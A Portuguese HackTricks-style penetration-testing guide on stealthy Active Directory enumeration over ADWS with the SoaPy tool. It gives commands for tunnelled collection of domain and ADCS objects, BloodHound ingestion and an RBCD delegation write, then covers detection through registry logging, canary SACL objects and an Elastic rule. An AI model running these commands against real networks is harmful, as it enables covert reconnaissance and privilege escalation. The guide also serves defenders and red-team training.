# Active Directory Web Services (ADWS) Enumeração & Coleta Stealth

{{#include ../../banners/hacktricks-training.md}}

## O que é ADWS?

Active Directory Web Services (ADWS) está **habilitado por padrão em todos os Controladores de Domínio desde o Windows Server 2008 R2** e escuta na porta TCP **9389**. Apesar do nome, **nenhum HTTP está envolvido**. Em vez disso, o serviço expõe dados no estilo LDAP através de uma pilha de protocolos de estrutura .NET proprietários:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Como o tráfego está encapsulado dentro desses frames SOAP binários e viaja por uma porta incomum, **a enumeração através do ADWS é muito menos provável de ser inspecionada, filtrada ou assinada do que o tráfego clássico LDAP/389 & 636**. Para os operadores, isso significa:

* Recon mais furtivo – As equipes azuis frequentemente se concentram em consultas LDAP.
* Liberdade para coletar de **hosts não-Windows (Linux, macOS)** através de um túnel 9389/TCP por meio de um proxy SOCKS.
* Os mesmos dados que você obteria via LDAP (usuários, grupos, ACLs, esquema, etc.) e a capacidade de realizar **escritas** (por exemplo, `msDs-AllowedToActOnBehalfOfOtherIdentity` para **RBCD**).

> NOTA: O ADWS também é usado por muitas ferramentas GUI/PowerShell do RSAT, então o tráfego pode se misturar com a atividade administrativa legítima.

## SoaPy – Cliente Python Nativo

[SoaPy](https://github.com/logangoins/soapy) é uma **reimplementação completa da pilha de protocolos ADWS em Python puro**. Ele cria os frames NBFX/NBFSE/NNS/NMF byte a byte, permitindo a coleta de sistemas semelhantes ao Unix sem tocar no runtime .NET.

### Principais Recursos

* Suporta **proxy através de SOCKS** (útil a partir de implantes C2).
* Filtros de busca detalhados idênticos ao LDAP `-q '(objectClass=user)'`.
* Operações de **escrita** opcionais ( `--set` / `--delete` ).
* Modo de saída **BOFHound** para ingestão direta no BloodHound.
* Flag `--parse` para embelezar timestamps / `userAccountControl` quando a legibilidade humana é necessária.

### Instalação (host do operador)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Stealth AD Collection Workflow

O seguinte fluxo de trabalho mostra como enumerar **objetos de domínio e ADCS** através do ADWS, convertê-los para JSON do BloodHound e caçar caminhos de ataque baseados em certificado – tudo a partir do Linux:

1. **Tunnel 9389/TCP** da rede alvo para sua máquina (por exemplo, via Chisel, Meterpreter, SSH dynamic port-forward, etc.). Exporte `export HTTPS_PROXY=socks5://127.0.0.1:1080` ou use `--proxyHost/--proxyPort` do SoaPy.

2. **Coletar o objeto de domínio raiz:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Coletar objetos relacionados ao ADCS do NC de Configuração:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Converter para BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Faça o upload do ZIP** na interface do BloodHound e execute consultas cypher como `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` para revelar caminhos de escalonamento de certificado (ESC1, ESC8, etc.).

### Escrevendo `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Combine isso com `s4u2proxy`/`Rubeus /getticket` para uma cadeia completa de **Delegação Constrangida Baseada em Recurso**.

## Detecção e Fortalecimento

### Registro Verboso do ADDS

Ative as seguintes chaves de registro nos Controladores de Domínio para expor buscas caras / ineficientes provenientes do ADWS (e LDAP):
```powershell
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics' -Name '15 Field Engineering' -Value 5 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Expensive Search Results Threshold' -Value 1 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Search Time Threshold (msecs)' -Value 0 -Type DWORD
```
Eventos aparecerão sob **Directory-Service** com o filtro LDAP completo, mesmo quando a consulta chegou via ADWS.

### Objetos Canary SACL

1. Crie um objeto fictício (por exemplo, usuário desativado `CanaryUser`).
2. Adicione um ACE de **Auditoria** para o principal _Everyone_, auditado em **ReadProperty**.
3. Sempre que um atacante realizar `(servicePrincipalName=*)`, `(objectClass=user)` etc., o DC emite **Event 4662** que contém o SID do usuário real – mesmo quando a solicitação é proxy ou se origina do ADWS.

Exemplo de regra pré-construída do Elastic:
```kql
(event.code:4662 and not user.id:"S-1-5-18") and winlog.event_data.AccessMask:"0x10"
```
## Resumo de Ferramentas

| Propósito | Ferramenta | Notas |
|-----------|------------|-------|
| Enumeração ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, leitura/escrita |
| Ingestão do BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Converte logs do SoaPy/ldapsearch |
| Comprometimento de Certificado | [Certipy](https://github.com/ly4k/Certipy) | Pode ser proxy através do mesmo SOCKS |

## Referências

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)

{{#include ../../banners/hacktricks-training.md}}
